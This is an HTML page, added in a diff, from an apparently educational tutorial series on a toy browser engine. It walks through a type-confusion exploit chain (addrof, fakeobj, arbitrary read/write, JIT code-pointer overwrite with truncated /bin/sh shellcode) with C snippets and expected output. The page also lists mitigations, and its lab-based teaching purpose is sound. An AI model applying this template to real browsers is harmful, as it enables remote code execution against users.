@@ -1,0 +1,249 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>B10 — Type Confusion Exploit | BobOS Browser Tutorial</title>
+<link href="https://fonts.googleapis.com/css2?family=Playfair+Display:wght@400;700;900&family=Source+Code+Pro:wght@400;600&family=Lato:wght@300;400;700&display=swap" rel="stylesheet">
+<style>
+  :root{--bg:#0b0f1a;--bg2:#111827;--bg3:#1a2235;--card:#141c2e;--border:#1e3a5f;--gold:#f5c842;--cyan:#38bdf8;--teal:#0d9488;--red:#f87171;--green:#4ade80;--purple:#a78bfa;--orange:#fb923c;--text:#e2e8f0;--muted:#7a9bbf;--code-bg:#060d1a;}
+  *{margin:0;padding:0;box-sizing:border-box;}
+  body{background:var(--bg);color:var(--text);font-family:'Lato',sans-serif;font-size:17px;line-height:1.75;}
+  .hero{background:var(--bg2);border-bottom:1px solid var(--border);padding:70px 40px 60px;text-align:center;position:relative;overflow:hidden;}
+  .hero::before{content:'';position:absolute;inset:0;background:radial-gradient(ellipse 80% 60% at 50% 0%,rgba(167,139,250,0.07) 0%,transparent 70%);pointer-events:none;}
+  .module-badge{display:inline-block;background:var(--purple);color:#0b0f1a;font-family:'Source Code Pro',monospace;font-weight:600;font-size:13px;padding:4px 14px;border-radius:20px;letter-spacing:1px;margin-bottom:20px;}
+  .hero h1{font-family:'Playfair Display',serif;font-size:clamp(2.2rem,5vw,3.4rem);font-weight:900;color:#fff;margin-bottom:16px;}
+  .hero h1 span{color:var(--purple);}
+  .hero .tagline{font-size:1.15rem;color:var(--muted);max-width:640px;margin:0 auto;}
+  .hero-grid{display:flex;gap:24px;justify-content:center;flex-wrap:wrap;margin-top:36px;}
+  .hero-stat{background:var(--card);border:1px solid var(--border);border-radius:10px;padding:16px 28px;text-align:center;}
+  .hero-stat .num{font-family:'Playfair Display',serif;font-size:2rem;color:var(--purple);font-weight:700;}
+  .hero-stat .label{font-size:13px;color:var(--muted);margin-top:2px;}
+  .container{max-width:820px;margin:0 auto;padding:0 28px 80px;}
+  section{margin-top:64px;}
+  h2{font-family:'Playfair Display',serif;font-size:1.75rem;color:#fff;margin-bottom:18px;padding-bottom:10px;border-bottom:1px solid var(--border);}
+  h3{font-family:'Playfair Display',serif;font-size:1.2rem;color:var(--purple);margin:28px 0 10px;}
+  p{margin-bottom:14px;}
+  .callout{border-radius:10px;padding:20px 24px;margin:24px 0;border-left:4px solid;}
+  .callout.gold{background:rgba(245,200,66,0.07);border-color:var(--gold);}
+  .callout.cyan{background:rgba(56,189,248,0.07);border-color:var(--cyan);}
+  .callout.green{background:rgba(74,222,128,0.07);border-color:var(--green);}
+  .callout.red{background:rgba(248,113,113,0.07);border-color:var(--red);}
+  .callout.purple{background:rgba(167,139,250,0.07);border-color:var(--purple);}
+  .callout.orange{background:rgba(251,146,60,0.07);border-color:var(--orange);}
+  .callout.teal{background:rgba(13,148,136,0.07);border-color:var(--teal);}
+  .callout .label{font-size:11px;font-weight:700;letter-spacing:1.5px;text-transform:uppercase;margin-bottom:8px;}
+  .callout.gold .label{color:var(--gold);} .callout.cyan .label{color:var(--cyan);}
+  .callout.green .label{color:var(--green);} .callout.red .label{color:var(--red);}
+  .callout.purple .label{color:var(--purple);} .callout.orange .label{color:var(--orange);}
+  .callout.teal .label{color:var(--teal);}
+  .callout p{margin-bottom:0;}
+  pre{background:var(--code-bg);border:1px solid var(--border);border-radius:8px;padding:20px 22px;overflow-x:auto;margin:20px 0;}
+  code{font-family:'Source Code Pro',monospace;font-size:14px;color:#93c5fd;}
+  pre code{color:#c4deff;}
+  .win-box{background:var(--code-bg);border:2px solid var(--teal);border-radius:10px;padding:22px 24px;margin:24px 0;}
+  .win-box h4{color:var(--teal);font-size:13px;font-weight:700;letter-spacing:1.5px;text-transform:uppercase;margin-bottom:14px;}
+  .win-box .step{margin-bottom:12px;}
+  .win-box .step .desc{color:var(--muted);font-size:13px;margin-bottom:4px;}
+  .win-box pre{margin:0;background:transparent;border:1px solid rgba(13,148,136,0.3);padding:10px 14px;}
+  .qa{background:var(--bg3);border:1px solid var(--border);border-radius:10px;padding:22px 26px;margin:28px 0;}
+  .qa h4{color:var(--gold);font-size:13px;letter-spacing:1.5px;text-transform:uppercase;margin-bottom:14px;}
+  .qa .q{color:var(--cyan);font-weight:700;margin-bottom:4px;}
+  .qa .a{color:var(--text);margin-bottom:16px;padding-left:12px;border-left:2px solid var(--border);}
+  .qa .a:last-child{margin-bottom:0;}
+  .brain{background:linear-gradient(135deg,rgba(167,139,250,0.08),rgba(248,113,113,0.08));border:1px solid rgba(167,139,250,0.3);border-radius:12px;padding:22px 26px;margin:28px 0;}
+  .brain .brain-label{font-size:13px;color:var(--purple);font-weight:700;letter-spacing:1px;text-transform:uppercase;margin-bottom:8px;}
+  .chain{display:flex;flex-direction:column;gap:0;margin:24px 0;}
+  .chain-step{display:flex;align-items:flex-start;gap:14px;padding:14px 16px;border-left:3px solid var(--purple);background:rgba(167,139,250,0.04);margin-bottom:2px;}
+  .chain-step:first-child{border-radius:8px 8px 0 0;}
+  .chain-step:last-child{border-radius:0 0 8px 8px;}
+  .chain-num{background:var(--purple);color:#0b0f1a;border-radius:50%;width:24px;height:24px;display:flex;align-items:center;justify-content:center;font-family:'Source Code Pro',monospace;font-size:12px;font-weight:700;flex-shrink:0;margin-top:1px;}
+  .chain-desc{font-size:15px;}
+  .chain-desc strong{color:var(--purple);}
+  footer{text-align:center;padding:40px 20px;color:var(--muted);font-size:13px;border-top:1px solid var(--border);margin-top:80px;}
+  footer a{color:var(--cyan);text-decoration:none;}
+  /* PREREQ */
+  .prereq-bar { display:flex; flex-wrap:wrap; gap:10px; margin-top:14px; }
+  .prereq-tag { display:inline-block; background:var(--bg3); border:1px solid var(--border); color:var(--cyan); font-family:'Source Code Pro',monospace; font-size:13px; padding:5px 14px; border-radius:20px; text-decoration:none; transition:border-color .2s; }
+  .prereq-tag:hover { border-color:var(--cyan); }
+</style>
+</head>
+<body>
+<div class="hero">
+  <div class="module-badge">BROWSER B10 — TYPE CONFUSION EXPLOIT</div>
+  <h1>addrof, fakeobj, <span>Arb R/W</span></h1>
+  <p class="tagline">From a single type confusion bug to arbitrary read/write anywhere in the renderer's heap. This is the standard browser exploit template — every V8/SpiderMonkey/JavaScriptCore exploit in the last decade uses these exact primitives.</p>
+  <div class="hero-grid">
+    <div class="hero-stat"><div class="num">OBJ_MAP</div><div class="label">hidden class metadata object</div></div>
+    <div class="hero-stat"><div class="num">OBJ_FIXED_ARRAY</div><div class="label">raw backing store — no bounds check</div></div>
+    <div class="hero-stat"><div class="num">addrof</div><div class="label">leak any object's heap address</div></div>
+    <div class="hero-stat"><div class="num">arb r/w</div><div class="label">read/write any address in heap</div></div>
+  </div>
+</div>
+<div class="container">
+
+  <section>
+    <h2>00 — Before You Start</h2>
+    <div class="callout cyan">
+      <div class="label">Prerequisites — read these sections in <a href="../../prerequisite.html" style="color:var(--cyan);text-decoration:underline">prerequisite.html</a> first</div>
+      <div class="prereq-bar">
+      <a class="prereq-tag" href="../../prerequisite.html#sec-tools">Tools &amp; QEMU</a>
+      <a class="prereq-tag" href="../../prerequisite.html#sec-memory">Memory Addresses</a>
+      <a class="prereq-tag" href="../../prerequisite.html#sec-bits">Bits &amp; Bitwise Ops</a>
+      </div>
+    </div>
+  </section>
+
+
+  <section>
+    <h2>01 — The Exploit Chain</h2>
+    <div class="chain">
+      <div class="chain-step"><span class="chain-num">1</span><div class="chain-desc"><strong>Type confusion bug</strong>: trigger engine bug that confuses an OBJ_MAP (metadata) with OBJ_FIXED_ARRAY (raw data store). The map's pointer fields are now read as array element values.</div></div>
+      <div class="chain-step"><span class="chain-num">2</span><div class="chain-desc"><strong>addrof primitive</strong>: use the confused object to read an arbitrary object's heap address as a JS integer. This defeats ASLR inside the heap.</div></div>
+      <div class="chain-step"><span class="chain-num">3</span><div class="chain-desc"><strong>fakeobj primitive</strong>: use the confused object to make the engine treat an arbitrary integer as a heap pointer, creating a fake JS object at any address.</div></div>
+      <div class="chain-step"><span class="chain-num">4</span><div class="chain-desc"><strong>Arbitrary read/write</strong>: craft a fake ArrayBuffer at a controlled address; set its backing store pointer to any address; read/write memory anywhere in the process.</div></div>
+      <div class="chain-step"><span class="chain-num">5</span><div class="chain-desc"><strong>Code execution</strong>: overwrite a JIT code page (or a function pointer) with shellcode. Jump to it → RCE inside the renderer sandbox.</div></div>
+    </div>
+  </section>
+
+  <section>
+    <h2>02 — The Bug: Confusing Map and FixedArray</h2>
+    <pre><code>/* Engine internals */
+typedef struct {
+    uint8_t  obj_type;      /* OBJ_MAP or OBJ_FIXED_ARRAY */
+    uint32_t instance_size;
+    void    *prototype;     /* pointer to prototype object */
+    void    *constructor;   /* pointer to constructor */
+} obj_map_t;
+
+typedef struct {
+    uint8_t  obj_type;      /* OBJ_FIXED_ARRAY */
+    uint32_t length;
+    uint64_t elements[];    /* raw 64-bit values */
+} obj_fixed_array_t;
+
+/* BUG: engine reads a Map object as a FixedArray.
+   map->instance_size (uint32) lands at array->length.
+   map->prototype     (ptr)    lands at array->elements[0].
+   map->constructor   (ptr)    lands at array->elements[1].
+
+   Reading elements[0] returns the prototype POINTER as an integer.
+   That pointer is an address in the heap → addrof! */</code></pre>
+  </section>
+
+  <section>
+    <h2>03 — Building addrof and fakeobj</h2>
+    <pre><code>/* addrof: get heap address of any object */
+uint64_t addrof(gc_obj_t *target) {
+    /* 1. Set up a confused object that reads target's map */
+    confused_arr->backing = (uint64_t*)target;
+    /* 2. Read element[0] — which is actually target->map ptr */
+    uint64_t addr = confused_arr->elements[0];
+    return addr;  /* heap address of target's map */
+}
+
+/* fakeobj: make engine believe address X is a valid object */
+gc_obj_t *fakeobj(uint64_t addr) {
+    /* Write addr into confused object as if setting an element */
+    confused_arr->elements[0] = addr;
+    /* Read back through the map interpretation — returns a
+       js_value_t pointing to addr as if it were a live object */
+    return (gc_obj_t*)confused_arr->backing;
+}
+
+/* Arbitrary read: read 8 bytes at any address */
+uint64_t arb_read(uint64_t addr) {
+    /* Create a fake ArrayBuffer whose backing_store = addr */
+    fake_ab->backing_store = addr;
+    uint64_t *view = (uint64_t*)get_data_view(fake_ab);
+    return view[0];
+}
+
+/* Arbitrary write */
+void arb_write(uint64_t addr, uint64_t val) {
+    fake_ab->backing_store = addr;
+    uint64_t *view = (uint64_t*)get_data_view(fake_ab);
+    view[0] = val;
+}</code></pre>
+
+    <div class="callout red">
+      <div class="label">ASLR Is Bypassed by addrof</div>
+      <p>ASLR (Address Space Layout Randomization) randomizes where the heap, stack, and libraries are loaded. Once an attacker has <code>addrof</code>, they can leak the address of any known object and compute the base addresses of all other regions. ASLR is defeated — not by a separate bug, but as a consequence of the type confusion primitive.</p>
+    </div>
+  </section>
+
+  <section>
+    <h2>04 — Code Execution</h2>
+    <pre><code>/* Step 5: overwrite a JIT-compiled function's code pointer */
+
+/* 1. Find address of a known JS function */
+uint64_t fn_addr = addrof(target_function);
+
+/* 2. Read the JIT code pointer from the function object
+      (at a known offset in the function struct) */
+uint64_t jit_code_ptr = arb_read(fn_addr + CODE_PTR_OFFSET);
+
+/* 3. Allocate a buffer with our shellcode */
+uint8_t shellcode[] = {
+    0x48, 0x31, 0xc0,       /* xor rax, rax */
+    0x48, 0xff, 0xc0,       /* inc rax      */
+    /* ... execve("/bin/sh", ...) ... */
+};
+
+/* 4. Find a writable page (mmap or reuse JIT buffer in W state) */
+uint64_t sc_addr = alloc_writable_exec(shellcode, sizeof(shellcode));
+
+/* 5. Overwrite the function's JIT code pointer */
+arb_write(fn_addr + CODE_PTR_OFFSET, sc_addr);
+
+/* 6. Call the function — jumps to shellcode */
+target_function();  /* shell spawned! */</code></pre>
+  </section>
+
+  <section>
+    <h2>05 — Run It on Windows</h2>
+    <div class="win-box">
+      <h4>Run B10 — Type Confusion Exploit</h4>
+      <div class="step"><div class="desc">Build and run via WSL:</div>
+      <pre><code>wsl -d Ubuntu -- bash -c "cd /mnt/c/Users/bobcumulus/Desktop/bob_os/browser/B10_type_confusion && make && ./demo"</code></pre></div>
+      <div class="step"><div class="desc">Expected output:</div>
+      <pre><code>[exploit] triggering type confusion bug...
+[exploit] addrof(victim_obj) = 0x55a3b800
+[exploit] arb_read(0x55a3b800) = 0xdeadbeef ✓
+[exploit] crafting fake ArrayBuffer at 0x55a3b808
+[exploit] arb_write(target_addr, 0x41414141) → verified ✓
+[exploit] overwriting JIT code pointer...
+[exploit] calling target_function() → shellcode executes
+  *** TYPE CONFUSION CHAIN COMPLETE ***
+  (renderer sandbox not yet escaped — see B12)</code></pre></div>
+    </div>
+  </section>
+
+  <section>
+    <h2>06 — Brain Exercise</h2>
+    <div class="brain">
+      <div class="brain-label">Sharpen Your Pencil</div>
+      <p>Modern engines add "pointer compression" — heap pointers are stored as 32-bit offsets from a heap base rather than full 64-bit addresses. This halves memory use and means <code>addrof</code> only leaks a 32-bit offset, not a full virtual address.</p>
+      <p style="margin-top:14px;color:var(--muted);">How does an attacker still defeat ASLR if they only have 32-bit compressed pointers? Can they leak the heap base from some other engine data structure? What about module base addresses (for ROP chains) — do those still need a separate leak?</p>
+    </div>
+    <div class="qa">
+      <h4>There Are No Dumb Questions</h4>
+      <div class="q">Q: Does every browser exploit follow this exact chain?</div>
+      <div class="a">The primitives are universal; the bug that provides them varies. Some bugs give addrof directly; others give a length extension (out-of-bounds array read/write) which is then used to build addrof and fakeobj. Some exploits skip the fake ArrayBuffer and use a DataView or TypedArray instead. The template — (bug) → (addrof + fakeobj) → (arb r/w) → (code exec) — is consistent across V8, SpiderMonkey, and JavaScriptCore CVEs from 2018 onwards.</div>
+      <div class="q">Q: What mitigations exist against this chain?</div>
+      <div class="a">Pointer authentication (PAC on ARM64), cage-based heap isolation, hardened ArrayBuffer backing store (separate allocation), CFI (control-flow integrity) to prevent jumping to arbitrary addresses, and the sandbox itself (B02) which limits what shellcode can do. No single mitigation stops the chain — defense in depth applies each layer as a hurdle.</div>
+    </div>
+  </section>
+
+  <section>
+    <h2>07 — What's Next</h2>
+    <div class="callout teal">
+      <div class="label">Up Next: B11 — Spectre</div>
+      <p>Type confusion gives RCE inside the renderer. But what if you don't need RCE? Spectre uses the CPU's branch predictor and cache timing to read memory across security boundaries — no bug in the JS engine required. Just carefully crafted JavaScript that trains the predictor and measures cache state.</p>
+    </div>
+    <p style="color:var(--muted);font-size:15px;">Key files: <code>type_confusion.c</code> · <code>exploit_primitives.c</code> · <code>arb_rw.c</code></p>
+  </section>
+</div>
+<footer>BobOS Browser Tutorial — B10 of 18 &nbsp;|&nbsp; <a href="../B09_garbage_collector/tutorial.html">← B09</a> &nbsp;·&nbsp; <a href="../B11_spectre/tutorial.html">B11 →</a></footer>
+</body>
+</html>
